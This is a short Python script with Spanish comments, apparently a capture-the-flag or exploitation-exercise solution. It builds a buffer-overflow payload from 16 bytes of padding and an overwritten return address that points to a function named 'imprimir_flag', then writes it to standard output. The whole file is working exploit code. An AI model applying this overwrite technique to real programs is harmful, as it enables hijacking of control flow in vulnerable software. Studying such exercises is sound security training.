from struct import pack
import sys

# Construccion del padding
padding = b"A" * (16)
return_addr = pack("<Q", 0x000055555555519d)  # Direccion de la funcion imprimir_flag

# Construccion del payload
payload = padding + return_addr

# Envio del payload
sys.stdout.buffer.write(payload)
